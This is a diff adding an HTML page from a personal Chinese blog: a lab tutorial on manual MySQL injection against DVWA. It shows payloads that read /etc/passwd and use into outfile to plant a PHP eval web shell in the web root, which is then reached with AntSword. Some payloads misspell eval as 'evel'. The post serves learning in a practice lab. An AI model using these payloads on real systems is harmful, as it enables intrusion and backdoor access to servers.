@@ -1,0 +1,420 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#mysql%E6%89%8B%E6%B3%A8%E4%B9%8Broot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86">MySQL手注之Root权限处理</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6">提权条件</a></li>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0">常用到的函数</a>
+<ul>
+<li><a href="#load_file">load_file()</a></li>
+<li><a href="#outfile%E5%92%8Cdumpfile">outfile()和dumpfile()</a>
+<ul>
+<li><a href="#into-outfile">into outfile()</a></li>
+<li><a href="#into-dumpfile">into dumpfile()</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a>
+<ul>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC">查看数据库版本</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8Bsecure_file_priv">查看secure_file_priv</a></li>
+<li><a href="#%E5%86%99%E5%85%A5payload">写入payload</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5">使用蚁剑连接</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E9%99%84%E5%BD%95">附录</a>
+<ul>
+<li><a href="#magic_quote_gpc">magic_quote_gpc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">MySQL手注之Root权限处理</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-16 / 5 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="mysql手注之root权限处理">MySQL手注之Root权限处理</h1>
+<p>学前疑问：</p>
+<ul>
+<li>注入的目的是啥？
+<ul>
+<li>得到数据库中的数据？</li>
+<li>得到目标的控制权限？</li>
+</ul>
+</li>
+</ul>
+<h2 id="原理">原理</h2>
+<p>利用写入函数写入一句话木马、后续shell连接的代码等（大概~</p>
+<h2 id="提权条件">提权条件</h2>
+<ul>
+<li>
+<p>当前操作数据库的用户为root权限（不一定需要root权限，但一定要有<strong>文件写入的权限</strong>，不然会白忙活</p>
+</li>
+<li>
+<p>能够得到到物理地址（报错、phpinfo页⾯、猜、爆破），后续的写入地址需要用到</p>
+</li>
+<li>
+<p>能够判断数据库的版本，从而决使用什么注入函数</p>
+<ul>
+<li>
+<p>5.5.53前，my.ini中<strong>secure_file_priv</strong> 变量默认为空，所以默认情况下是<strong>可以直接通过SQL语句来导出</strong>⽂件的。</p>
+</li>
+<li>
+<p>5.5后，mysql推出secure_file_priv变量，用于控制文件的写入导出</p>
+<ul>
+<li>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出</li>
+<li>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下</li>
+<li>当secure_file_priv设置为空 ，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="常用到的函数">常用到的函数</h2>
+<h3 id="load_file">load_file()</h3>
+<p>读取文件</p>
+<pre><code>select load_file('/etc/passwd'); 
+
+select load_file(0x2F6574632F706173737764);
+</code></pre>
+<h3 id="outfile和dumpfile">outfile()和dumpfile()</h3>
+<p>写入文件</p>
+<h4 id="into-outfile">into outfile()</h4>
+<p>into outfile()写入时会在每行结束时<strong>⾃动加上换⾏符</strong></p>
+<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into outfile '/var/www/html/muma.php' ;
+</code></pre>
+<h4 id="into-dumpfile">into dumpfile()</h4>
+<p>into dumpfile()函数写入<strong>原⽣内容</strong>，常用于写入<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/996661?fr=aladdin">⼆进制⽂件</a></p>
+<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into DUMPFILE '/var/www/html/muma.php' ;
+</code></pre>
+<p>以下仅限配合dumpfile()使用（未验证）</p>
+<pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; lines starting by 'xxxx' 
+</code></pre>
+<ul>
+<li>
+<p>lines starting by '写⼊的内容' 设置<strong>每⾏数据开头</strong>的字符，可以为单个或多个字符，默认情况下不使⽤任何字符</p>
+</li>
+<li>
+<p>lines terminated by '写⼊的内容' 设置<strong>每⾏数据结尾</strong>的字符，可以为单个或多个字符，默认值是&quot;\n&quot;。</p>
+</li>
+</ul>
+<p>所以说into outfile()就是into dumpfile()的简约版本？嘿嘿~</p>
+<h2 id="实践">实践</h2>
+<p>目标：dvwa</p>
+<p>难度：low</p>
+<h3 id="查看数据库版本">查看数据库版本</h3>
+<pre><code>select @@version;
+</code></pre>
+<pre><code>5.7.26
+</code></pre>
+<h3 id="查看secure_file_priv">查看secure_file_priv</h3>
+<p>可以知道当前数据库版本是在5.5.53后的，存在secure_file_priv，查看当前设置</p>
+<pre><code>show global variables like '%secure%';
+</code></pre>
+<pre><code>Variable_name				Value
+require_secure_transport	OFF
+secure_auth					ON
+secure_file_priv			NULL
+</code></pre>
+<p>当前为NULL，即不可以随意导出写入</p>
+<h3 id="写入payload">写入payload</h3>
+<p>写入payload试试</p>
+<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'#
+</code></pre>
+<p>提示</p>
+<pre><code>File 'C:phpStudy_64phpstudy_proWWWDVWAmuma.php' already exists
+</code></pre>
+<p>windows下需要加转义符号</p>
+<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
+</code></pre>
+<p>实际运行的代码为</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'# ';
+</code></pre>
+<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
+</code></pre>
+<p>被拒绝了，难道是secure_file_priv设置为NULL的原因吗？</p>
+<p>将my.ini文件中设置secure_file_priv为空试试</p>
+<figure data-type="image" tabindex="1"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170602.png" alt="QQ截图20210417170602" loading="lazy"></figure>
+<pre><code>show global variables like '%secure%';
+</code></pre>
+<pre><code>Variable_name				Value
+require_secure_transport	OFF
+secure_auth					ON
+secure_file_priv			
+</code></pre>
+<p>重新载入payload</p>
+<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
+</code></pre>
+<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
+</code></pre>
+<p>好家伙，继续被拒绝</p>
+<p>查阅资料后发现，当前根本没有写入权限……</p>
+<p>查看权限的命令</p>
+<pre><code>select * from mysql.user where user='dvwa';
+</code></pre>
+<p>发现根本没有文件读写的权限</p>
+<p>所以说，一定要在写入前注意当前用户<strong>是否具有写入权限</strong></p>
+<p>解决方法</p>
+<p>将当前用户切换为root用户或者赋予当前用户相应的权限</p>
+<p>继续执行刚刚的payload</p>
+<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
+</code></pre>
+<p>页面出现了报警信息</p>
+<figure data-type="image" tabindex="2"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165647.png" alt="QQ截图20210417165647" loading="lazy"></figure>
+<p>问题不大，查看文件，发现已经写入到本地了</p>
+<figure data-type="image" tabindex="3"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165756.png" alt="QQ截图20210417165756" loading="lazy"></figure>
+<p>文件内容如下</p>
+<figure data-type="image" tabindex="4"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165818.png" alt="QQ截图20210417165818" loading="lazy"></figure>
+<h3 id="使用蚁剑连接">使用蚁剑连接</h3>
+<figure data-type="image" tabindex="5"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165939.png" alt="QQ截图20210417165939" loading="lazy"></figure>
+<p>发现返回数据为空，大概是写入的东西不太对，换个paylad</p>
+<pre><code>1' into outfile 'C:\\phpStudy_64\\phpstudy_pro\\WWW\\DVWA\\muma.php' lines starting by '&lt;?php @eval($_POST[pass])?&gt;'#
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170121-1618651389179.png" alt="QQ截图20210417170121" loading="lazy"></figure>
+<p>重新连接</p>
+<figure data-type="image" tabindex="7"><img src="https://xssong17.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170133.png" alt="QQ截图20210417170133" loading="lazy"></figure>
+<p>成功</p>
+<h2 id="总结">总结</h2>
+<ul>
+<li>
+<p>在进行写入文件前一定要确认当前用户是否拥有写入文件权限</p>
+</li>
+<li>
+<p>确认当前secure_file_priv为空或者为某一确定的路径</p>
+</li>
+<li>
+<p>注入的内容用<strong>双引号</strong>括起来</p>
+</li>
+<li>
+<p>注入的内容需要以<?php evel($_POST[pass]);?>等连接代码开头</p>
+</li>
+</ul>
+<h2 id="附录">附录</h2>
+<h3 id="magic_quote_gpc">magic_quote_gpc</h3>
+<p>魔术引号~会对输入的特殊符号进行转义</p>
+<p>参考资料</p>
+<p>https://blog.csdn.net/niexinming/article/details/49109683</p>
+<p>https://www.jb51.net/article/29462.htm</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://xssong17.github.io/tag/wgo_p-85C/">
+            <span class="flex-auto">渗透</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  sql注入绕过姿势总结（转载）
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/">
+                <h3 class="post-title">
+                  MySQL手注之延时盲注(基于时间的盲注)
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
